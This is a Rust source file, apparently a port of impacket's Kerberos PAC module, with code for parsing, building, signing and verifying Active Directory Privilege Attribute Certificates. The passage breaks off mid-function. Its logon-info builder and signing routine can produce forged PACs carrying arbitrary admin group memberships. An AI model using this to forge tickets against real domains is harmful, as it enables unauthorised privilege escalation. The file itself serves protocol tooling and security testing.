//! `[MS-PAC]`: Privilege Attribute Certificate parsing, construction, and signing.
//!
//! Implements Microsoft Active Directory Kerberos PAC validation and forging
//! per `[MS-PAC]`, `[MS-KILE]`, and `impacket/krb5/pac.py`.

use impacket_core::der;
use impacket_core::CoreError;
use impacket_ndr::{NdrDeserialize, NdrReader, NdrWriter, RpcSid};

use crate::crypto::{
    aes128_cts_hmac_sha1_96_checksum, aes128_cts_hmac_sha1_96_decrypt,
    aes256_cts_hmac_sha1_96_checksum, aes256_cts_hmac_sha1_96_decrypt, rc4_hmac_checksum,
    rc4_hmac_decrypt,
};

/// PAC buffer types defined in `[MS-PAC]` Section 2.2.1.
pub const PAC_LOGON_INFO: u32 = 1;
pub const PAC_CREDENTIALS_INFO: u32 = 2;
pub const PAC_SERVER_CHECKSUM: u32 = 6;
pub const PAC_PRIVSVR_CHECKSUM: u32 = 7;
pub const PAC_CLIENT_INFO_TYPE: u32 = 10;
pub const PAC_DELEGATION_INFO: u32 = 11;
pub const PAC_UPN_DNS_INFO: u32 = 12;
pub const PAC_CLIENT_CLAIMS_INFO_TYPE: u32 = 13;
pub const PAC_DEVICE_INFO_TYPE: u32 = 14;
pub const PAC_DEVICE_CLAIMS_INFO_TYPE: u32 = 15;
pub const PAC_ATTRIBUTES_INFO: u32 = 17;
pub const PAC_REQUESTOR_INFO: u32 = 18;

/// Kerberos Checksum Types used in PAC signature buffers (`[MS-PAC]` Section 2.8).
pub const CKSUMTYPE_CRC32: u32 = 1;
pub const CKSUMTYPE_RSA_MD5: u32 = 7;
pub const CKSUMTYPE_HMAC_SHA1_96_AES128: u32 = 15;
pub const CKSUMTYPE_HMAC_SHA1_96_AES256: u32 = 16;
pub const CKSUMTYPE_HMAC_MD5: u32 = 0xFFFF_FF76; // -138

/// Key usage for PAC signature checksums (`[MS-PAC]` Section 2.8.1).
pub const KERB_NON_KERB_CKSUM_SALT: i32 = 17;

/// `PAC_SIGNATURE_DATA` (`[MS-PAC]` Section 2.8).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PacSignatureData {
    pub signature_type: u32,
    pub signature: Vec<u8>,
    pub rodc_identifier: Option<u16>,
}

impl PacSignatureData {
    pub fn parse(data: &[u8]) -> Result<Self, CoreError> {
        if data.len() < 4 {
            return Err(CoreError::BufferUnderflow {
                needed: 4,
                available: data.len(),
            });
        }
        let signature_type = u32::from_le_bytes(data[0..4].try_into().unwrap());
        let (sig_len, has_rodc) = match signature_type {
            CKSUMTYPE_CRC32 => (4, data.len() >= 4 + 4 + 2),
            CKSUMTYPE_RSA_MD5 | CKSUMTYPE_HMAC_MD5 => (16, data.len() >= 4 + 16 + 2),
            CKSUMTYPE_HMAC_SHA1_96_AES128 | CKSUMTYPE_HMAC_SHA1_96_AES256 => {
                (12, data.len() >= 4 + 12 + 2)
            }
            _ => {
                // If unknown, take the rest of the slice or default 16
                let rem = data.len() - 4;
                (rem, false)
            }
        };

        if data.len() < 4 + sig_len {
            return Err(CoreError::BufferUnderflow {
                needed: 4 + sig_len,
                available: data.len(),
            });
        }

        let signature = data[4..4 + sig_len].to_vec();
        let rodc_identifier = if has_rodc && data.len() >= 4 + sig_len + 2 {
            Some(u16::from_le_bytes(
                data[4 + sig_len..4 + sig_len + 2].try_into().unwrap(),
            ))
        } else {
            None
        };

        Ok(Self {
            signature_type,
            signature,
            rodc_identifier,
        })
    }

    pub fn to_bytes(&self) -> Vec<u8> {
        let mut out = Vec::with_capacity(4 + self.signature.len() + 2);
        out.extend_from_slice(&self.signature_type.to_le_bytes());
        out.extend_from_slice(&self.signature);
        if let Some(rodc) = self.rodc_identifier {
            out.extend_from_slice(&rodc.to_le_bytes());
        }
        out
    }
}

/// `PAC_CLIENT_INFO` (`[MS-PAC]` Section 2.7).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PacClientInfo {
    pub client_id: u64,
    pub name: String,
}

impl PacClientInfo {
    pub fn parse(data: &[u8]) -> Result<Self, CoreError> {
        if data.len() < 10 {
            return Err(CoreError::BufferUnderflow {
                needed: 10,
                available: data.len(),
            });
        }
        let client_id = u64::from_le_bytes(data[0..8].try_into().unwrap());
        let name_len = u16::from_le_bytes(data[8..10].try_into().unwrap()) as usize;
        if data.len() < 10 + name_len {
            return Err(CoreError::BufferUnderflow {
                needed: 10 + name_len,
                available: data.len(),
            });
        }
        let name_bytes = &data[10..10 + name_len];
        let utf16: Vec<u16> = name_bytes
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes(c.try_into().unwrap()))
            .collect();
        let name = String::from_utf16_lossy(&utf16);
        Ok(Self { client_id, name })
    }

    pub fn to_bytes(&self) -> Vec<u8> {
        let utf16: Vec<u8> = self
            .name
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect();
        let mut out = Vec::with_capacity(10 + utf16.len());
        out.extend_from_slice(&self.client_id.to_le_bytes());
        out.extend_from_slice(&(utf16.len() as u16).to_le_bytes());
        out.extend_from_slice(&utf16);
        out
    }
}

/// `PAC_ATTRIBUTES_INFO` (`[MS-PAC]` Section 2.14).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PacAttributesInfo {
    pub flags_length: u32,
    pub flags: u32,
}

impl PacAttributesInfo {
    pub fn parse(data: &[u8]) -> Result<Self, CoreError> {
        if data.len() < 8 {
            return Err(CoreError::BufferUnderflow {
                needed: 8,
                available: data.len(),
            });
        }
        let flags_length = u32::from_le_bytes(data[0..4].try_into().unwrap());
        let flags = u32::from_le_bytes(data[4..8].try_into().unwrap());
        Ok(Self {
            flags_length,
            flags,
        })
    }

    pub fn to_bytes(&self) -> Vec<u8> {
        let mut out = Vec::with_capacity(8);
        out.extend_from_slice(&self.flags_length.to_le_bytes());
        out.extend_from_slice(&self.flags.to_le_bytes());
        out
    }
}

/// Detailed user authentication and group membership info from `PAC_LOGON_INFO` (`[MS-PAC]` Section 2.5).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PacLogonInfo {
    pub logon_time: u64,
    pub logoff_time: u64,
    pub kick_off_time: u64,
    pub password_last_set: u64,
    pub password_can_change: u64,
    pub password_must_change: u64,
    pub effective_name: String,
    pub full_name: String,
    pub logon_script: String,
    pub profile_path: String,
    pub home_directory: String,
    pub home_directory_drive: String,
    pub user_id: u32,
    pub primary_group_id: u32,
    pub group_rids: Vec<(u32, u32)>, // (rid, attributes)
    pub user_flags: u32,
    pub logon_server: String,
    pub logon_domain_name: String,
    pub logon_domain_id: Option<RpcSid>,
    pub user_account_control: u32,
    pub sub_auth_status: u32,
    pub last_successful_ilogon: u64,
    pub last_failed_ilogon: u64,
    pub failed_ilogon_count: u32,
    pub resource_group_domain_sid: Option<RpcSid>,
    pub resource_group_rids: Vec<(u32, u32)>,
}

impl PacLogonInfo {
    /// Constructs full user SID from `logon_domain_id` and `user_id`.
    pub fn user_sid(&self) -> Option<RpcSid> {
        let domain_sid = self.logon_domain_id.as_ref()?;
        let mut user_sid = domain_sid.clone();
        user_sid.sub_authorities.push(self.user_id);
        Some(user_sid)
    }

    /// Checks if user is member of Domain Admins (RID 512).
    pub fn is_domain_admin(&self) -> bool {
        self.group_rids.iter().any(|(rid, _)| *rid == 512)
    }

    /// Checks if user is member of Enterprise Admins (RID 519).
    pub fn is_enterprise_admin(&self) -> bool {
        self.group_rids.iter().any(|(rid, _)| *rid == 519)
    }

    /// Checks if user is member of Schema Admins (RID 518).
    pub fn is_schema_admin(&self) -> bool {
        self.group_rids.iter().any(|(rid, _)| *rid == 518)
    }

    /// Checks if user has administrative group membership (512, 519, 518, 544).
    pub fn is_admin(&self) -> bool {
        self.is_domain_admin()
            || self.is_enterprise_admin()
            || self.is_schema_admin()
            || self.group_rids.iter().any(|(rid, _)| *rid == 544)
    }

    /// Converts Windows FILETIME to Unix timestamp (seconds since 1970).
    pub fn filetime_to_unix(ft: u64) -> Option<i64> {
        if ft == 0 || ft >= 0x7FFF_FFFF_FFFF_0000 || ft < 116_444_736_000_000_000 {
            None
        } else {
            Some(((ft - 116_444_736_000_000_000) / 10_000_000) as i64)
        }
    }

    /// Parses a raw Type Serialization Version 1 `PAC_LOGON_INFO` buffer.
    pub fn parse(data: &[u8]) -> Result<Self, CoreError> {
        let ndr_data = if data.len() >= 16 && data[0] == 1 && data[1] == 0x10 {
            &data[16..]
        } else {
            data
        };

        if ndr_data.len() < 208 {
            return Err(CoreError::BufferUnderflow {
                needed: 208,
                available: ndr_data.len(),
            });
        }

        let mut r = NdrReader::new(ndr_data);

        let logon_time = read_ndr_filetime(&mut r)?;
        let logoff_time = read_ndr_filetime(&mut r)?;
        let kick_off_time = read_ndr_filetime(&mut r)?;
        let password_last_set = read_ndr_filetime(&mut r)?;
        let password_can_change = read_ndr_filetime(&mut r)?;
        let password_must_change = read_ndr_filetime(&mut r)?;

        // EffectiveName RPC_UNICODE_STRING
        let _eff_len = r.read_u16()?;
        let _eff_max = r.read_u16()?;
        let eff_ptr = r.read_u32()?;

        // FullName
        let _full_len = r.read_u16()?;
        let _full_max = r.read_u16()?;
        let full_ptr = r.read_u32()?;

        // LogonScript
        let _script_len = r.read_u16()?;
        let _script_max = r.read_u16()?;
        let script_ptr = r.read_u32()?;

        // ProfilePath
        let _prof_len = r.read_u16()?;
        let _prof_max = r.read_u16()?;
        let prof_ptr = r.read_u32()?;

        // HomeDirectory
        let _home_len = r.read_u16()?;
        let _home_max = r.read_u16()?;
        let home_ptr = r.read_u32()?;

        // HomeDirectoryDrive
        let _drive_len = r.read_u16()?;
        let _drive_max = r.read_u16()?;
        let drive_ptr = r.read_u32()?;

        let _logon_count = r.read_u16()?;
        let _bad_pwd_count = r.read_u16()?;

        let user_id = r.read_u32()?;
        let primary_group_id = r.read_u32()?;

        let _group_count = r.read_u32()?;
        let group_ptr = r.read_u32()?;

        let user_flags = r.read_u32()?;
        let _session_key = r.read_fixed_array::<16>()?;

        // LogonServer
        let _srv_len = r.read_u16()?;
        let _srv_max = r.read_u16()?;
        let srv_ptr = r.read_u32()?;

        // LogonDomainName
        let _dom_len = r.read_u16()?;
        let _dom_max = r.read_u16()?;
        let dom_ptr = r.read_u32()?;

        let dom_sid_ptr = r.read_u32()?;
        let _lm_key = r.read_fixed_array::<8>()?;

        let user_account_control = r.read_u32()?;
        let sub_auth_status = r.read_u32()?;

        let last_successful_ilogon = read_ndr_filetime(&mut r)?;
        let last_failed_ilogon = read_ndr_filetime(&mut r)?;
        let failed_ilogon_count = r.read_u32()?;
        let _reserved3 = r.read_u32()?;

        let res_domain_sid_ptr = r.read_u32()?;
        let _res_group_count = r.read_u32()?;
        let res_group_ptr = r.read_u32()?;

        // Deferred referents in order
        let effective_name = if eff_ptr != 0 {
            read_ndr_varying_string(&mut r)?
        } else {
            String::new()
        };

        let full_name = if full_ptr != 0 {
            read_ndr_varying_string(&mut r)?
        } else {
            String::new()
        };

        let logon_script = if script_ptr != 0 {
            read_ndr_varying_string(&mut r)?
        } else {
            String::new()
        };

        let profile_path = if prof_ptr != 0 {
            read_ndr_varying_string(&mut r)?
        } else {
            String::new()
        };

        let home_directory = if home_ptr != 0 {
            read_ndr_varying_string(&mut r)?
        } else {
            String::new()
        };

        let home_directory_drive = if drive_ptr != 0 {
            read_ndr_varying_string(&mut r)?
        } else {
            String::new()
        };

        let group_rids = if group_ptr != 0 {
            read_ndr_groups(&mut r)?
        } else {
            Vec::new()
        };

        let logon_server = if srv_ptr != 0 {
            read_ndr_varying_string(&mut r)?
        } else {
            String::new()
        };

        let logon_domain_name = if dom_ptr != 0 {
            read_ndr_varying_string(&mut r)?
        } else {
            String::new()
        };

        let logon_domain_id = if dom_sid_ptr != 0 {
            Some(RpcSid::ndr_deserialize(&mut r)?)
        } else {
            None
        };

        let resource_group_domain_sid = if res_domain_sid_ptr != 0 {
            Some(RpcSid::ndr_deserialize(&mut r)?)
        } else {
            None
        };

        let resource_group_rids = if res_group_ptr != 0 {
            read_ndr_groups(&mut r)?
        } else {
            Vec::new()
        };

        Ok(Self {
            logon_time,
            logoff_time,
            kick_off_time,
            password_last_set,
            password_can_change,
            password_must_change,
            effective_name,
            full_name,
            logon_script,
            profile_path,
            home_directory,
            home_directory_drive,
            user_id,
            primary_group_id,
            group_rids,
            user_flags,
            logon_server,
            logon_domain_name,
            logon_domain_id,
            user_account_control,
            sub_auth_status,
            last_successful_ilogon,
            last_failed_ilogon,
            failed_ilogon_count,
            resource_group_domain_sid,
            resource_group_rids,
        })
    }
}

fn read_ndr_varying_string(r: &mut NdrReader) -> Result<String, CoreError> {
    let _max_count = r.read_u32()?;
    let _offset = r.read_u32()?;
    let actual_count = r.read_u32()? as usize;
    let byte_len = actual_count * 2;
    let bytes = r.read_bytes(byte_len)?;
    r.align(4)?;
    let utf16: Vec<u16> = bytes
        .chunks_exact(2)
        .map(|c| u16::from_le_bytes(c.try_into().unwrap()))
        .collect();
    let s = String::from_utf16_lossy(&utf16);
    Ok(s.trim_end_matches('\0').to_string())
}

fn read_ndr_groups(r: &mut NdrReader) -> Result<Vec<(u32, u32)>, CoreError> {
    let count = r.read_u32()? as usize;
    let mut groups = Vec::with_capacity(count);
    for _ in 0..count {
        let rid = r.read_u32()?;
        let attrs = r.read_u32()?;
        groups.push((rid, attrs));
    }
    Ok(groups)
}

fn read_ndr_filetime(r: &mut NdrReader) -> Result<u64, CoreError> {
    let low = r.read_u32()? as u64;
    let high = r.read_u32()? as u64;
    Ok((high << 32) | low)
}

/// `PACTYPE` container (`[MS-PAC]` Section 2.2).
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct Pac {
    pub buffers: Vec<(u32, Vec<u8>)>,
}

impl Pac {
    pub fn new() -> Self {
        Self {
            buffers: Vec::new(),
        }
    }

    /// Parses a raw `PACTYPE` binary blob into structured PAC buffers.
    pub fn parse(data: &[u8]) -> Result<Self, CoreError> {
        if data.len() < 8 {
            return Err(CoreError::BufferUnderflow {
                needed: 8,
                available: data.len(),
            });
        }
        let c_buffers = u32::from_le_bytes(data[0..4].try_into().unwrap()) as usize;
        let _version = u32::from_le_bytes(data[4..8].try_into().unwrap());

        let header_needed = 8 + c_buffers * 16;
        if data.len() < header_needed {
            return Err(CoreError::BufferUnderflow {
                needed: header_needed,
                available: data.len(),
            });
        }

        let mut buffers = Vec::with_capacity(c_buffers);
        for i in 0..c_buffers {
            let offset_pos = 8 + i * 16;
            let ul_type = u32::from_le_bytes(data[offset_pos..offset_pos + 4].try_into().unwrap());
            let cb_size =
                u32::from_le_bytes(data[offset_pos + 4..offset_pos + 8].try_into().unwrap())
                    as usize;
            let offset =
                u64::from_le_bytes(data[offset_pos + 8..offset_pos + 16].try_into().unwrap())
                    as usize;

            if offset + cb_size > data.len() {
                return Err(CoreError::BufferUnderflow {
                    needed: offset + cb_size,
                    available: data.len(),
                });
            }

            let payload = data[offset..offset + cb_size].to_vec();
            buffers.push((ul_type, payload));
        }

        Ok(Self { buffers })
    }

    /// Serializes the PAC buffers into wire-format `PACTYPE` with 8-byte alignment padding.
    pub fn build(&self) -> Vec<u8> {
        let c_buffers = self.buffers.len();
        let headers_size = 8 + c_buffers * 16;
        let mut offset_data = headers_size;

        let mut info_headers = Vec::with_capacity(c_buffers * 16);
        let mut data_blobs = Vec::new();

        for (ul_type, data) in &self.buffers {
            let size = data.len();
            info_headers.extend_from_slice(&ul_type.to_le_bytes());
            info_headers.extend_from_slice(&(size as u32).to_le_bytes());
            info_headers.extend_from_slice(&(offset_data as u64).to_le_bytes());

            data_blobs.extend_from_slice(data);
            let pad_len = ((size + 7) / 8 * 8) - size;
            data_blobs.extend(std::iter::repeat(0u8).take(pad_len));

            offset_data = (offset_data + size + 7) / 8 * 8;
        }

        let mut out = Vec::with_capacity(headers_size + data_blobs.len());
        out.extend_from_slice(&(c_buffers as u32).to_le_bytes());
        out.extend_from_slice(&0u32.to_le_bytes()); // Version = 0
        out.extend_from_slice(&info_headers);
        out.extend_from_slice(&data_blobs);
        out
    }

    pub fn get_buffer(&self, ul_type: u32) -> Option<&[u8]> {
        self.buffers
            .iter()
            .find(|(t, _)| *t == ul_type)
            .map(|(_, d)| d.as_slice())
    }

    pub fn set_buffer(&mut self, ul_type: u32, data: Vec<u8>) {
        if let Some(pos) = self.buffers.iter().position(|(t, _)| *t == ul_type) {
            self.buffers[pos] = (ul_type, data);
        } else {
            self.buffers.push((ul_type, data));
        }
    }

    pub fn get_signature(&self, ul_type: u32) -> Result<PacSignatureData, CoreError> {
        let buf = self.get_buffer(ul_type).ok_or_else(|| {
            CoreError::ProtocolError(format!("Missing PAC signature buffer type {}", ul_type))
        })?;
        PacSignatureData::parse(buf)
    }

    pub fn get_client_info(&self) -> Result<PacClientInfo, CoreError> {
        let buf = self.get_buffer(PAC_CLIENT_INFO_TYPE).ok_or_else(|| {
            CoreError::ProtocolError("Missing PAC_CLIENT_INFO buffer in PAC".into())
        })?;
        PacClientInfo::parse(buf)
    }

    pub fn get_logon_info(&self) -> Result<PacLogonInfo, CoreError> {
        let buf = self.get_buffer(PAC_LOGON_INFO).ok_or_else(|| {
            CoreError::ProtocolError("Missing PAC_LOGON_INFO buffer in PAC".into())
        })?;
        PacLogonInfo::parse(buf)
    }

    pub fn get_attributes_info(&self) -> Result<PacAttributesInfo, CoreError> {
        let buf = self.get_buffer(PAC_ATTRIBUTES_INFO).ok_or_else(|| {
            CoreError::ProtocolError("Missing PAC_ATTRIBUTES_INFO buffer in PAC".into())
        })?;
        PacAttributesInfo::parse(buf)
    }

    pub fn get_requestor_info(&self) -> Result<RpcSid, CoreError> {
        let buf = self.get_buffer(PAC_REQUESTOR_INFO).ok_or_else(|| {
            CoreError::ProtocolError("Missing PAC_REQUESTOR_INFO buffer in PAC".into())
        })?;
        if buf.len() < 8 {
            return Err(CoreError::BufferUnderflow {
                needed: 8,
                available: buf.len(),
            });
        }
        let revision = buf[0];
        let sub_count = buf[1] as usize;
        let mut identifier_authority = [0u8; 6];
        identifier_authority.copy_from_slice(&buf[2..8]);
        if buf.len() < 8 + sub_count * 4 {
            return Err(CoreError::BufferUnderflow {
                needed: 8 + sub_count * 4,
                available: buf.len(),
            });
        }
        let mut sub_authorities = Vec::with_capacity(sub_count);
        for i in 0..sub_count {
            let offset = 8 + i * 4;
            let sub = u32::from_le_bytes(buf[offset..offset + 4].try_into().unwrap());
            sub_authorities.push(sub);
        }
        Ok(RpcSid {
            revision,
            sub_authorities,
            identifier_authority,
        })
    }

    /// Signs the PAC: zeroes out server and privsvr signatures, calculates server checksum
    /// over un-signed PAC bytes, then calculates privsvr checksum over the server signature bytes.
    pub fn sign_pac(
        &mut self,
        server_key: &[u8],
        server_etype: i32,
        privsvr_key: &[u8],
        privsvr_etype: i32,
    ) -> Result<(), CoreError> {
        let server_sig_type = match server_etype {
            23 => CKSUMTYPE_HMAC_MD5,
            17 => CKSUMTYPE_HMAC_SHA1_96_AES128,
            18 => CKSUMTYPE_HMAC_SHA1_96_AES256,
            _ => {
                return Err(CoreError::ProtocolError(format!(
                    "Unsupported server signature etype: {}",
                    server_etype
                )))
            }
        };

        let privsvr_sig_type = match privsvr_etype {
            23 => CKSUMTYPE_HMAC_MD5,
            17 => CKSUMTYPE_HMAC_SHA1_96_AES128,
            18 => CKSUMTYPE_HMAC_SHA1_96_AES256,
            _ => {
                return Err(CoreError::ProtocolError(format!(
                    "Unsupported privsvr signature etype: {}",
                    privsvr_etype
                )))
            }
        };

        let server_zero_len = match server_sig_type {
            CKSUMTYPE_HMAC_MD5 => 16,
            _ => 12,
        };

        let privsvr_zero_len = match privsvr_sig_type {
            CKSUMTYPE_HMAC_MD5 => 16,
            _ => 12,
        };

        // 1. Zero out signatures
        let zero_server = PacSignatureData {
            signature_type: server_sig_type,
            signature: vec![0u8; server_zero_len],
            rodc_identifier: None,
        };
        let zero_privsvr = PacSignatureData {
            signature_type: privsvr_sig_type,
            signature: vec![0u8; privsvr_zero_len],
            rodc_identifier: None,
        };

        self.set_buffer(PAC_SERVER_CHECKSUM, zero_server.to_bytes());
        self.set_buffer(PAC_PRIVSVR_CHECKSUM, zero_privsvr.to_bytes());

        // 2. Generate raw PAC with zeroed signatures
        let pac_bytes_to_sign = self.build();

        // 3. Compute Server signature over full PAC bytes
        let server_sig = match server_etype {
            23 => {
                let k: [u8; 16] = server_key.try_into().map_err(|_| {
                    CoreError::ProtocolError("RC4 server key must be 16 bytes".into())
                })?;
                rc4_hmac_checksum(&k, KERB_NON_KERB_CKSUM_SALT, &pac_bytes_to_sign).to_vec()
            }
            17 => {
                let k: [u8; 16] = server_key.try_into().map_err(|_| {
                    CoreError::ProtocolError("AES-128 server key must be 16 bytes".into())
                })?;
                aes128_cts_hmac_sha1_96_checksum(&k, KERB_NON_KERB_CKSUM_SALT, &pac_bytes_to_sign)
                    .to_vec()
            }
            18 => {
                let k: [u8; 32] = server_key.try_into().map_err(|_| {
                    CoreError::ProtocolError("AES-256 server key must be 32 bytes".into())
                })?;
                aes256_cts_hmac_sha1_96_checksum(&k, KERB_NON_KERB_CKSUM_SALT, &pac_bytes_to_sign)
                    .to_vec()
            }
            _ => unreachable!(),
        };

        // 4. Compute PrivSvr (KDC) signature over the Server signature bytes
        let privsvr_sig = match privsvr_etype {
            23 => {
                let k: [u8; 16] = privsvr_key.try_into().map_err(|_| {
                    CoreError::ProtocolError("RC4 privsvr key must be 16 bytes".into())
                })?;
                rc4_hmac_checksum(&k, KERB_NON_KERB_CKSUM_SALT, &server_sig).to_vec()
            }
            17 => {
                let k: [u8; 16] = privsvr_key.try_into().map_err(|_| {
                    CoreError::ProtocolError("AES-128 privsvr key must be 16 bytes".into())
                })?;
                aes128_cts_hmac_sha1_96_checksum(&k, KERB_NON_KERB_CKSUM_SALT, &server_sig).to_vec()
            }
            18 => {
                let k: [u8; 32] = privsvr_key.try_into().map_err(|_| {
                    CoreError::ProtocolError("AES-256 privsvr key must be 32 bytes".into())
                })?;
                aes256_cts_hmac_sha1_96_checksum(&k, KERB_NON_KERB_CKSUM_SALT, &server_sig).to_vec()
            }
            _ => unreachable!(),
        };

        // 5. Update buffers with computed signatures
        let final_server = PacSignatureData {
            signature_type: server_sig_type,
            signature: server_sig,
            rodc_identifier: None,
        };
        let final_privsvr = PacSignatureData {
            signature_type: privsvr_sig_type,
            signature: privsvr_sig,
            rodc_identifier: None,
        };

        self.set_buffer(PAC_SERVER_CHECKSUM, final_server.to_bytes());
        self.set_buffer(PAC_PRIVSVR_CHECKSUM, final_privsvr.to_bytes());

        Ok(())
    }

    /// Verifies the server signature and optionally the privsvr signature in the PAC.
    pub fn verify_pac(
        &self,
        server_key: &[u8],
        server_etype: i32,
        privsvr_key: Option<(&[u8], i32)>,
    ) -> Result<bool, CoreError> {
        let existing_server_sig = self.get_signature(PAC_SERVER_CHECKSUM)?;
        let existing_privsvr_sig = self.get_signature(PAC_PRIVSVR_CHECKSUM)?;

        let mut pac_copy = self.clone();

        let zero_server = PacSignatureData {
            signature_type: existing_server_sig.signature_type,
            signature: vec![0u8; existing_server_sig.signature.len()],
            rodc_identifier: existing_server_sig.rodc_identifier,
        };
        let zero_privsvr = PacSignatureData {
            signature_type: existing_privsvr_sig.signature_type,
            signature: vec![0u8; existing_privsvr_sig.signature.len()],
            rodc_identifier: existing_privsvr_sig.rodc_identifier,
        };

        pac_copy.set_buffer(PAC_SERVER_CHECKSUM, zero_server.to_bytes());
        pac_copy.set_buffer(PAC_PRIVSVR_CHECKSUM, zero_privsvr.to_bytes());

        let pac_bytes = pac_copy.build();

        let expected_server_sig = match server_etype {
            23 => {
                let k: [u8; 16] = server_key.try_into().map_err(|_| {
                    CoreError::ProtocolError("RC4 server key must be 16 bytes".into())
                })?;
                rc4_hmac_checksum(&k, KERB_NON_KERB_CKSUM_SALT, &pac_bytes).to_vec()
            }
            17 => {
                let k: [u8; 16] = server_key.try_into().map_err(|_| {
                    CoreError::ProtocolError("AES-128 server key must be 16 bytes".into())
                })?;
                aes128_cts_hmac_sha1_96_checksum(&k, KERB_NON_KERB_CKSUM_SALT, &pac_bytes).to_vec()
            }
            18 => {
                let k: [u8; 32] = server_key.try_into().map_err(|_| {
                    CoreError::ProtocolError("AES-256 server key must be 32 bytes".into())
                })?;
                aes256_cts_hmac_sha1_96_checksum(&k, KERB_NON_KERB_CKSUM_SALT, &pac_bytes).to_vec()
            }
            _ => return Ok(false),
        };

        if existing_server_sig.signature != expected_server_sig {
            return Ok(false);
        }

        if let Some((k_bytes, k_etype)) = privsvr_key {
            let expected_privsvr_sig = match k_etype {
                23 => {
                    let k: [u8; 16] = k_bytes.try_into().map_err(|_| {
                        CoreError::ProtocolError("RC4 privsvr key must be 16 bytes".into())
                    })?;
                    rc4_hmac_checksum(&k, KERB_NON_KERB_CKSUM_SALT, &expected_server_sig).to_vec()
                }
                17 => {
                    let k: [u8; 16] = k_bytes.try_into().map_err(|_| {
                        CoreError::ProtocolError("AES-128 privsvr key must be 16 bytes".into())
                    })?;
                    aes128_cts_hmac_sha1_96_checksum(&k, KERB_NON_KERB_CKSUM_SALT, &expected_server_sig)
                        .to_vec()
                }
                18 => {
                    let k: [u8; 32] = k_bytes.try_into().map_err(|_| {
                        CoreError::ProtocolError("AES-256 privsvr key must be 32 bytes".into())
                    })?;
                    aes256_cts_hmac_sha1_96_checksum(&k, KERB_NON_KERB_CKSUM_SALT, &expected_server_sig)
                        .to_vec()
                }
                _ => return Ok(false),
            };

            if existing_privsvr_sig.signature != expected_privsvr_sig {
                return Ok(false);
            }
        }

        Ok(true)
    }
}

fn write_ndr_string(writer: &mut NdrWriter, s: &str) {
    let utf16: Vec<u8> = s.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
    let char_count = (utf16.len() / 2) as u32;
    writer.write_u32(char_count);
    writer.write_u32(0);
    writer.write_u32(char_count);
    writer.write_bytes(&utf16);
}

/// Builds a Type Serialization Version 1 `PAC_LOGON_INFO` buffer containing NDR-encoded
/// `KERB_VALIDATION_INFO` (`[MS-PAC]` Section 2.5).
pub fn build_pac_logon_info(
    username: &str,
    domain_name: &str,
    domain_sid: &RpcSid,
    user_rid: u32,
    group_rids: &[u32],
    auth_time_unix: i64,
) -> Vec<u8> {
    let mut writer = NdrWriter::new();

    let ft_low = (auth_time_unix * 10_000_000 + 116_444_736_000_000_000) as u32;
    let ft_high = ((auth_time_unix * 10_000_000 + 116_444_736_000_000_000) >> 32) as u32;

    // FILETIME LogonTime
    writer.write_u32(ft_low);
    writer.write_u32(ft_high);
    // FILETIME LogoffTime (never: 0x7FFFFFFF_FFFFFFFF)
    writer.write_u32(0xFFFF_FFFF);
    writer.write_u32(0x7FFF_FFFF);
    // FILETIME KickOffTime (never)
    writer.write_u32(0xFFFF_FFFF);
    writer.write_u32(0x7FFF_FFFF);
    // FILETIME PasswordLastSet
    writer.write_u32(0);
    writer.write_u32(0);
    // FILETIME PasswordCanChange
    writer.write_u32(0);
    writer.write_u32(0);
    // FILETIME PasswordMustChange (never)
    writer.write_u32(0xFFFF_FFFF);
    writer.write_u32(0x7FFF_FFFF);

    // RPC_UNICODE_STRING EffectiveName
    writer.write_u16((username.len() * 2) as u16);
    writer.write_u16((username.len() * 2) as u16);
    writer.write_u32(1); // pointer tag

    // RPC_UNICODE_STRING FullName
    writer.write_u16(0);
    writer.write_u16(0);
    writer.write_u32(0);

    // RPC_UNICODE_STRING LogonScript
    writer.write_u16(0);
    writer.write_u16(0);
    writer.write_u32(0);

    // RPC_UNICODE_STRING ProfilePath
    writer.write_u16(0);
    writer.write_u16(0);
    writer.write_u32(0);

    // RPC_UNICODE_STRING HomeDirectory
    writer.write_u16(0);
    writer.write_u16(0);
    writer.write_u32(0);

    // RPC_UNICODE_STRING HomeDirectoryDrive
    writer.write_u16(0);
    writer.write_u16(0);
    writer.write_u32(0);

    // LogonCount, BadPasswordCount
    writer.write_u16(0);
    writer.write_u16(0);

    // UserId, PrimaryGroupId
    writer.write_u32(user_rid);
    writer.write_u32(513); // Domain Users

    // GroupCount, GroupIds pointer
    writer.write_u32(group_rids.len() as u32);
    writer.write_u32(2); // pointer tag

    // UserFlags
    writer.write_u32(0);
    // UserSessionKey (16 bytes zeros)
    writer.write_fixed_array(&[0u8; 16]);

    // RPC_UNICODE_STRING LogonServer
    writer.write_u16(0);
    writer.write_u16(0);
    writer.write_u32(0);

    // RPC_UNICODE_STRING LogonDomainName
    writer.write_u16((domain_name.len() * 2) as u16);
    writer.write_u16((domain_name.len() * 2) as u16);
    writer.write_u32(3); // pointer tag

    // LogonDomainId PRPC_SID pointer
    writer.write_u32(4); // pointer tag

    // LMKey (8 bytes zeros)
    writer.write_fixed_array(&[0u8; 8]);
    // UserAccountControl (NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD = 0x10200)
    writer.write_u32(0x0001_0200);
    // SubAuthStatus, LastSuccessfulILogon, LastFailedILogon, FailedILogonCount, Reserved3
    writer.write_u32(0);
    writer.write_u32(0);
    writer.write_u32(0);
    writer.write_u32(0);
    writer.write_u32(0);
    writer.write_u32(0);
    writer.write_u32(0);

    // ResourceGroupDomainSid (NULL), ResourceGroupCount (0), ResourceGroupIds (NULL)
    writer.write_u32(0);
    writer.write_u32(0);
    writer.write_u32(0);

    // --- Deferred referents ---
    // 1: EffectiveName string
    write_ndr_string(&mut writer, username);

    // 2: GroupIds array: count + (RelativeId, Attributes = 7)
    writer.write_u32(group_rids.len() as u32);
    for &rid in group_rids {
        writer.write_u32(rid);
        writer.write_u32(0x07); // SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
    }

    // 3: LogonDomainName string
    write_ndr_string(&mut writer, domain_name);

    // 4: LogonDomainId SID
    let sub_count = domain_sid.sub_authorities.len() as u32;
    writer.write_u32(sub_count);
